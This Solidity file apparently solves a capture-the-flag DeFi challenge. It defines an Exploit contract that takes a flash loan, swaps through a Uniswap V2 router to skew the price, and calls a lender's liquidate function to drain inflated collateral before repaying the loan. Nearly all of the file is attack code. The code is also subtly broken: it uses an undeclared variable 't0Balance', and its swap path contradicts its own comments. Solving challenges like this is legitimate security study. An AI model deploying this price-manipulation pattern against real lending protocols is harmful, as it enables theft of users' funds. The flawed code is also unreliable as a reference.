// SPDX-License-Identifier: private

pragma solidity 0.8.0;

// cant import full uniswap router. solc version mismatch
// ParserError: Source file requires different compiler version (current compiler is 0.8.0+commit.c7dfd78e.Emscripten.clang) - note that nightly builds are considered to be strictly less than the released version
//  --> contracts/UniswapV2Router02.sol:5:1:
//  |
//  | pragma solidity =0.6.6;
//  | ^^^^^^^^^^^^^^^^^^^^^^^

// import "./UniswapV2Router02.sol";
// so we extract only required method

import "./Setup.sol";

/*
interface IUniswapV2Pair {
    function mint(address to) external returns (uint liquidity);
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface ERC20Like {
    function transfer(address dst, uint qty) external returns (bool);
    function transferFrom(address src, address dst, uint qty) external returns (bool);
    function approve(address dst, uint qty) external returns (bool);
    
    function balanceOf(address who) external view returns (uint);
}

interface WETH9 is ERC20Like {
    function deposit() external payable;
}
*/

/*
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = weth.balanceOf(address(this));
    require(amount <= balanceBefore, "Not enough token balance");

    weth.transfer(msg.sender, amount);

    (bool success,) = msg.sender.call(
        abi.encodeWithSignature(
            "receiveFlashLoan(uint256)",
            amount
        )
    );
    require(success, "External call failed");

    require(weth.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
}
*/

interface IUniswapV2Router02 {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Exploit {
    // for exploiting I will need all existing references:
    // setup, lender, token, flashloan and uniswap stuff
    // token pair in US
    // AMM model of k = a * b
    IUniswapV2Pair public pair;
    // a reference to the lender
    Lender public lender;
    // the 2 specific tokens involved
    Token public token;
    WETH9 public weth;
    // definition of 2 tokens involved in the LP according to ERC20 interface
    ERC20Like public tokenToken;
    ERC20Like public tokenWeth;
    // flash loan provider
    FlashLoan public flashloanPool;
    // no we need a way to make the swap of tokens in uniswap. the 'go to' way for this
    // is using a router but it could be done also by calling the pair methods directly
    IUniswapV2Router02 public router;
    // a reference to setup contract
    Setup public setup;

    // we initialize all previous variables in the constructor
    // based on our development environment data
    constructor(Setup _setup) {
        // 1 extract from existing Setup contract all available data to be in sync
        setup = _setup;
        weth = setup.weth();
        //factory = setup.factory();
        token = setup.token();
        pair = setup.pair();
        lender = setup.lender();
        flashloanPool = setup.flashloanPool();
        // development environment address: 
        // CTF environment address: 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        // also get the ERC20 'versions' of the tokens
        tokenToken = ERC20Like(address(token));
        tokenWeth = ERC20Like(address(weth));
        // finally approve transfers in our behalf
        uint256 maxAmount = type(uint256).max;
        weth.approve(address(lender), maxAmount);
        token.approve(address(lender), maxAmount);
        weth.approve(address(router), maxAmount);
        token.approve(address(router), maxAmount);
    }

    function attack() public payable {
        require(msg.value > 0, "eth is needed");
        //we deposit some eth to get WETH
        weth.deposit{value: msg.value}();
        
        // confirm our new current weth balance
        uint256 balanceBefore = weth.balanceOf(address(this));
        require(balanceBefore == msg.value, "failed to get weth");

        // now request a flash loan an borrow some third party tokens
        flashloanPool.flashLoan(1000 ether); // max 1000 ETH
        // after requesting flashloan 1000 eth will be transfered to this exploit balance
        // and callback method receiveFlashLoan(uint256) will be executed
        // ** receiveFlashLoan is called **/
    }

    /**
    receiveFlashLoan is called each time a flashloan is received
     */
    function receiveFlashLoan(uint256 amount) external {
        // at this point I already have WETH balance in my account (in the context of this tx)
        // now we need to start doing some market price manipulation
        // the goal is simple: try to call lender's liquidate method having big 'amount' value and small 'rate()' value
        // so that uint256 collateralValueRepaid = amount / rate(); is as big as possible and then is transfer to us
        // weth.transfer(msg.sender, collateralValueRepaid);

        // generate the uniswap pair path of token -> weth
        // https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02#swapexacttokensfortokens
        uint256 availableTokens = token.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);

        // make sure approve is done
        weth.approve(address(router), amount);
        uint256 maxAmount = type(uint256).max;
        uint256[] memory swapResponse = router.swapExactTokensForTokens(
            t0Balance / 2,
            1,
            path,
            address(this),
            maxAmount
        );
        require(swapResponse.length >=1, "invalid swap response");

        // now call the 'manipulable' method in our victim (setup) position
        uint256 swappedTokens = swapResponse[1];
        lender.liquidate(address(setup), swappedTokens);

        // finally return the flash loan
        weth.transfer(address(flashloanPool), amount);

        // make a balance check to verify our attack works
        require(weth.balanceOf(address(this)) > availableTokens, "attack failed");
    }
}